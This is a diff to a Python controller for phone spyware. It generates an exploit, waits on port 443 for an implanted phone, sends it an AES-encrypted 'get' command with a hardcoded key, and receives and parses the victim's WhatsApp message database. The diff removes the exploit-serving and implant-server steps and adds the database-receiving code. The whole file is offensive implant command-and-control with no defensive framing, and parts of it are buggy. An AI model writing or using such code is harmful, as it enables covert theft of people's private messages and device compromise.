@@ -1,4 +1,4 @@
-import http.server, socket, sqlite3, json, requests, datetime, os
+import http.server, socket, sqlite3, json, requests, datetime, os, time, subprocess
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from Crypto.Cipher import AES
 import gen_exploit
@@ -6,17 +6,9 @@ import os
 
 # uses port 12345, ensure later processes use a different port
 # TODO move the desired exploit file into this directory so it will be forwarded to the phone when GET request received
-def listen_for_phone_and_send_exploit_file():
-    server_address = ('', 80)
-    print("Waiting on port 80 for client to connect")
-    s = http.server.HTTPServer(server_address, http.server.SimpleHTTPRequestHandler)
-    s.handle_request()
-    
+
 def prepare_implant():
     pass
-
-def start_implant_server():
-    os.system("python3 implant-server.py")
 
 
 def steal_database():
@@ -24,11 +16,12 @@ def steal_database():
     iv = "5468697320697320616e204956343536"
     obj = AES.new(bytes.fromhex(key), AES.MODE_CBC, bytes.fromhex(iv))
     ciphertext = obj.encrypt(b"get" + b"\x00" * 13)
+    print("The get command nhas been encrypted")
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     port = 443             
     s.bind(('', port))
     s.listen(1)
-    print("Listening on port 443")
+    print("Listening on port 443 for a connection from the phone")
     count = 0 
     while count < 1:
         conn, addr = s.accept()
@@ -36,14 +29,16 @@ def steal_database():
         conn.send(ciphertext)
         print("Encrypted 'get database' command sent to phone")
         count += 1
-        conn.close() 
-        print("Connection closed")
-        s.close()
+        database = conn.recv()
+        db = open("msgstore.db", "w+")
+        db.write(database)
+        db.close()
+    
 
 # Parses WhatsApp message database and stores the messages in a dictionary
 def decode_whatsapp_messages():
     print("Starting to decode WhatsApp messages from the SQLite3 Database")
-    path_to_msg_database = '../whatsapp-databases/msgstore.db'
+    path_to_msg_database = 'msgstore.db'
     c = connect_to_db(path_to_msg_database)
     c.execute("SELECT * FROM legacy_available_messages_view;")
     messages = c.fetchall()
@@ -67,12 +62,9 @@ def connect_to_db(filepath):
     return c
 
 if __name__ == "__main__":
-    # host = 'localhost'
     gen_exploit.gen_exploit()
-    start_implant_server()
-    listen_for_phone_and_send_exploit_file()
-    # send_implant(host)
-    # steal_database()
-    # decode_whatsapp_messages()
+    steal_database()
+    time.sleep(10)
+    decode_whatsapp_messages()
  
    
